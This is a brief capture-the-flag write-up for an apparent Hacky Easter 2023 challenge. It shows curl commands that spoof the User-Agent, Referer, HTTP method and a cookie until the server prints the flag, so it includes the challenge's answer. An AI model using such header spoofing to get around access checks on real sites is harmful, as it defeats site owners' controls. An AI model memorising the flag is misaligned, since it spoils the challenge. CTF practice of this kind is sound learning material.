The Hamster has a flag for you.

[http://ch.hackyeaster.com:2301](http://ch.hackyeaster.com:2301/)

curl -X GET http://ch.hackyeaster.com:2301/feed
🕴️ only hamster-agent is allowed

Sounds like we need to change the user agent to get it to work.

curl -X GET -A "hamster-agent" http://ch.hackyeaster.com:2301/feed
⛳ GET invalid

curl -X PUT -A "hamster-agent" http://ch.hackyeaster.com:2301/feed
🛑 request must come from hackyhamster.org

curl -X PUT -A "hamster-agent" -H 'Referer: hackyhamster.org' http://ch.hackyeaster.com:2301/feed                                
🍪 brownie not found

curl -X PUT -A "hamster-agent" -H 'Referer: hackyhamster.org' -H 'Cookie: brownie=baked' http://ch.hackyeaster.com:2301/feed 
🚩 he2023{s1mpl3_h34d3r_t4mp3r1ng}